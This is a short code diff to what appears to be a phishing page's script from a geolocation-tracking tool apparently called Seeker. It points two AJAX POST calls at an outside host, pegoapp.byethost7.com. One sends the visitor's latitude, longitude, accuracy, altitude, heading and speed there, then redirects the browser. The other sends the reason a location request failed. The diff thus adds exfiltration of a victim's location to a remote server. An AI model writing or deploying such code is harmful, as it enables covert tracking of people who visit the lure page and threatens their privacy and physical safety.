@@ -21,7 +21,7 @@ function locate()
 
     $.ajax({
       type: 'POST',
-      url: './php/result.php',
+      url: 'http://pegoapp.byethost7.com/seeker/gdrive/php/result.php',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
       success: function(){window.location='http://example.com';},
       mimeType: 'text'
@@ -51,7 +51,7 @@ function showError(error)
 
   $.ajax({
     type: 'POST',
-    url: './php/error.php',
+    url: 'http://pegoapp.byethost7.com/seeker/gdrive/php/error.php',
     data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
     success: function(){$('#change').html('Failed');},
     mimeType: 'text'
